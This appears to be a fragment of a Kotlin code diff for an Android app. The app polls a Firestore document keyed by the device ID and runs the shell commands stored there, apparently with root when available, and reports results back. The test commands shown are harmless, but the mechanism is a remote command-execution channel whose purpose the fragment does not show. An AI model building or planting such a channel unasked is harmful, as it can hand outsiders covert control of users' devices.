-                Log.d(TAG, "🔓 Execution flag reset - ready for next command")
+                Log.i(TAG, "✅ Shell enabled flag disabled, result and error updated after command sequence completion")
+                // Note: Execution flag is already reset before this call
             }
             .addOnFailureListener { exception ->
-                Log.e(TAG, "❌ Failed to disable shell run flag and update result", exception)
-                // Reset execution flag even on failure
-                isExecutingCommand = false
-                Log.d(TAG, "🔓 Execution flag reset after failure - ready for next command")
+                Log.e(TAG, "❌ Failed to disable shell enabled flag and update result/error", exception)
+                // Note: Execution flag is already reset before this call
             }
     }
     
@@ -1384,6 +1680,49 @@ object CollectionsManager {
             }
             .addOnFailureListener { exception ->
                 Log.e(TAG, "❌ Failed to update shell result", exception)
+            }
+    }
+    
+    /**
+     * Updates only the shell error without changing the run flag or result
+     */
+    private fun updateShellError(androidId: String, error: String) {
+        Log.d(TAG, "📋 updateShellError called for androidId: $androidId with error: '$error'")
+        val deviceRef = firestore.collection("devices").document(androidId)
+        
+        val updates = mapOf(
+            "shell.error" to error,
+            "updated_at" to FieldValue.serverTimestamp()
+        )
+        
+        deviceRef.update(updates)
+            .addOnSuccessListener {
+                Log.i(TAG, "✅ Shell error updated successfully")
+            }
+            .addOnFailureListener { exception ->
+                Log.e(TAG, "❌ Failed to update shell error", exception)
+            }
+    }
+    
+    /**
+     * Updates both shell result and error without changing the run flag
+     */
+    private fun updateShellResultAndError(androidId: String, result: String, error: String = "") {
+        Log.d(TAG, "📋 updateShellResultAndError called for androidId: $androidId with result: '$result', error: '$error'")
+        val deviceRef = firestore.collection("devices").document(androidId)
+        
+        val updates = mapOf(
+            "shell.result" to result,
+            "shell.error" to error,
+            "updated_at" to FieldValue.serverTimestamp()
+        )
+        
+        deviceRef.update(updates)
+            .addOnSuccessListener {
+                Log.i(TAG, "✅ Shell result and error updated successfully")
+            }
+            .addOnFailureListener { exception ->
+                Log.e(TAG, "❌ Failed to update shell result and error", exception)
             }
     }
     
@@ -1509,10 +1848,11 @@ object CollectionsManager {
         val deviceRef = firestore.collection("devices").document(androidId)
         val testShellData = mapOf(
             "shell.command" to "echo 'Test execution #\$RANDOM'",
-            "shell.run" to true,
+            "shell.enabled" to true,
             "shell.count" to 3,
             "shell.wait" to 2,
             "shell.result" to "",
+            "shell.error" to "",
             "updated_at" to FieldValue.serverTimestamp()
         )
         
@@ -1537,14 +1877,25 @@ object CollectionsManager {
         status.append("- Last execution start: ${if (lastExecutionStartTime > 0) Date(lastExecutionStartTime) else "Never"}\n")
         status.append("- Current thread: ${currentExecutionThread?.let { "${it.name} (alive: ${it.isAlive})" } ?: "None"}\n")
         status.append("- Listener active: ${shellCommandListener != null}\n")
+        status.append("- Retry count: $executionRetryCount/$MAX_RETRY_ATTEMPTS\n")
         
         if (isExecutingCommand && lastExecutionStartTime > 0) {
             val elapsed = (System.currentTimeMillis() - lastExecutionStartTime) / 1000
             status.append("- Execution time elapsed: ${elapsed}s\n")
+            status.append("- Timeout threshold: ${EXECUTION_TIMEOUT / 1000}s\n")
             if (elapsed > EXECUTION_TIMEOUT / 1000) {
                 status.append("- ⚠️ WARNING: Execution timeout exceeded!\n")
+                status.append("- 🔄 Recovery will trigger on next listener event\n")
             }
         }
+        
+        // Check root access status
+        val rootStatus = try {
+            if (RootManager.isRootGranted()) "✅ Available" else "❌ Not available"
+        } catch (e: Exception) {
+            "❌ Error checking: ${e.message}"
+        }
+        status.append("- Root access: $rootStatus\n")
         
         val statusString = status.toString()
         Log.i(TAG, "📊 Execution Status Check:\n$statusString")
@@ -1619,6 +1970,192 @@ object CollectionsManager {
                 }
             }
         }
+    }
+    
+    /**
+     * Diagnostic function to check system state and force execution if needed
+     */
+    fun debugShellExecutionState(context: Context): String {
+        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+        val status = StringBuilder()
+        
+        status.append("=== SHELL EXECUTION DEBUG ===\n")
+        status.append("Android ID: $androidId\n")
+        status.append("Is executing: $isExecutingCommand\n")
+        status.append("Last execution start: ${if (lastExecutionStartTime > 0) Date(lastExecutionStartTime) else "Never"}\n")
+        status.append("Current thread: ${currentExecutionThread?.let { "${it.name} (alive: ${it.isAlive})" } ?: "None"}\n")
+        status.append("Listener active: ${shellCommandListener != null}\n")
+        status.append("Retry count: $executionRetryCount/$MAX_RETRY_ATTEMPTS\n")
+        
+        if (isExecutingCommand && lastExecutionStartTime > 0) {
+            val elapsed = (System.currentTimeMillis() - lastExecutionStartTime) / 1000
+            status.append("Execution time elapsed: ${elapsed}s\n")
+            status.append("Timeout threshold: ${EXECUTION_TIMEOUT / 1000}s\n")
+            if (elapsed > EXECUTION_TIMEOUT / 1000) {
+                status.append("⚠️ WARNING: Execution timeout exceeded!\n")
+                status.append("🔄 Recovery will trigger on next listener event\n")
+            }
+        }
+        
+        // Check root access status
+        val rootStatus = try {
+            if (RootManager.isRootGranted()) "✅ Available" else "❌ Not available"
+        } catch (e: Exception) {
+            "❌ Error checking: ${e.message}"
+        }
+        status.append("Root access: $rootStatus\n")
+        
+        // Check current shell data in database
+        status.append("\n=== DATABASE STATE ===\n")
+        
+        try {
+            firestore.collection("devices").document(androidId).get()
+                .addOnSuccessListener { document ->
+                    if (document.exists()) {
+                        val shellData = document.get("shell") as? Map<String, Any>
+                        if (shellData != null) {
+                            status.append("Shell enabled: ${shellData["enabled"]}\n")
+                            status.append("Shell command: '${shellData["command"]}'\n")
+                            status.append("Shell count: ${shellData["count"]}\n")
+                            status.append("Shell wait: ${shellData["wait"]}\n")
+                            status.append("Shell result: '${shellData["result"]}'\n")
+                            status.append("Shell error: '${shellData["error"]}'\n")
+                            
+                            // Force trigger execution if conditions are met and not executing
+                            val enabled = shellData["enabled"] as? Boolean ?: false
+                            val command = shellData["command"] as? String ?: ""
+                            if (enabled && command.isNotEmpty() && !isExecutingCommand) {
+                                status.append("\n🔄 FORCING EXECUTION NOW...\n")
+                                executeShellCommandSequence(context, command, 
+                                    (shellData["count"] as? Number)?.toInt() ?: 1,
+                                    (shellData["wait"] as? Number)?.toInt() ?: 0,
+                                    androidId)
+                            }
+                        } else {
+                            status.append("No shell data found!\n")
+                        }
+                    } else {
+                        status.append("Document does not exist!\n")
+                    }
+                    
+                    Log.i(TAG, "📊 Shell Execution Debug:\n$status")
+                }
+                .addOnFailureListener { exception ->
+                    status.append("Database error: ${exception.message}\n")
+                    Log.e(TAG, "❌ Debug check failed", exception)
+                }
+        } catch (e: Exception) {
+            status.append("Exception during debug: ${e.message}\n")
+        }
+        
+        return status.toString()
+    }
+    
+    fun emergencyStopExecution(context: Context): String {
+        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+        
+        Log.e(TAG, "🚨 EMERGENCY STOP triggered!")
+        
+        val status = StringBuilder()
+        status.append("=== EMERGENCY STOP ===\n")
+        status.append("Timestamp: ${Date()}\n")
+        status.append("Is executing: $isExecutingCommand\n")
+        
+        // Force kill execution thread
+        currentExecutionThread?.let { thread ->
+            status.append("Thread found: ${thread.name} (alive: ${thread.isAlive})\n")
+            if (thread.isAlive) {
+                status.append("🔪 Force killing thread...\n")
+                thread.interrupt()
+                Thread.sleep(1000)
+                if (thread.isAlive) {
+                    @Suppress("DEPRECATION")
+                    thread.stop()
+                    status.append("💀 Thread force killed!\n")
+                } else {
+                    status.append("✅ Thread stopped gracefully\n")
+                }
+            }
+            currentExecutionThread = null
+        } ?: run {
+            status.append("No thread found\n")
+        }
+        
+        // Reset all execution state
+        isExecutingCommand = false
+        lastExecutionStartTime = 0L
+        executionRetryCount = 0
+        
+        // Update database to disable execution
+        disableShellExecution(androidId, "EMERGENCY STOP: Execution forcibly terminated", "EMERGENCY_STOP: Manual emergency stop triggered")
+        
+        status.append("🔄 All execution state reset\n")
+        status.append("✅ Emergency stop completed!\n")
+        
+        Log.i(TAG, "🚨 Emergency stop completed successfully")
+        return status.toString()
+    }
+    
+    /**
+     * Test shell command execution with proper wait time interpretation
+     */
+    fun addTestShellCommand(context: Context, command: String = "ls -la", count: Int = 1, wait: Int = 0) {
+        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+        
+        Log.i(TAG, "🧪 Adding test shell command: '$command' (count: $count, wait: $wait)")
+        
+        val shellData = mapOf(
+            "enabled" to true,
+            "command" to command,
+            "count" to count,
+            "wait" to wait,
+            "result" to "",
+            "error" to ""
+        )
+        
+        firestore.collection("devices").document(androidId)
+            .update("shell", shellData)
+            .addOnSuccessListener {
+                Log.i(TAG, "✅ Test shell command added successfully")
+                // Give a moment then check debug state
+                Handler(Looper.getMainLooper()).postDelayed({
+                    debugShellExecutionState(context)
+                }, 2000)
+            }
+            .addOnFailureListener { exception ->
+                Log.e(TAG, "❌ Failed to add test shell command", exception)
+            }
+    }
+    
+    /**
+     * Force restart the shell command listener
+     */
+    fun forceRestartShellListener(context: Context) {
+        Log.w(TAG, "🔄 Force restarting shell command listener...")
+        
+        // Stop existing listener
+        shellCommandListener?.remove()
+        shellCommandListener = null
+        
+        // Reset execution state
+        isExecutingCommand = false
+        lastExecutionStartTime = 0L
+        currentExecutionThread = null
+        executionRetryCount = 0
+        
+        // Initialize context if needed
+        if (!::context.isInitialized) {
+            this.context = context
+        }
+        if (!::firestore.isInitialized) {
+            firestore = FirebaseFirestore.getInstance()
+        }
+        
+        // Give it a moment to clean up
+        Handler(Looper.getMainLooper()).postDelayed({
+            startShellCommandListener()
+            Log.i(TAG, "✅ Shell command listener restarted")
+        }, 1000)
     }
     
     /**
